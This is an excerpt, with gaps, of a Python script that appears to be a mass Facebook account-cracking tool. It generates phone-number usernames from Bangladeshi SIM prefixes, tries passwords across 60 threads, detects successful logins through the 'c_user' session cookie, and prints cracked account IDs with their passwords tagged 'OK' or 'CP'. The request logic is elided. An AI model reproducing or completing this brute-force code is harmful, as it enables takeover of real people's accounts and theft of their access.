...
def Main():
	os.system('clear')
	print(logo)
	print("<> \033[1;35m SIM CODE : [017 018 019 013 015 016] ")
	love = input('<> SELECT : ')
	...
	for nmbr in range(limit):
		...
		user.append(nmp)
	with tred(max_workers=60) as Abdullah:
		os.system('clear')
		print(logo)
		tl = str(len(user))
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print(f'\r\33[1;92m[Abdullah-OK] '+cid+' ¤ '+ps+'\33[0;92m')
                oks.append(cid)
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\33[1;92m[Abdullah-CP] {uid} ¤ {ps}")
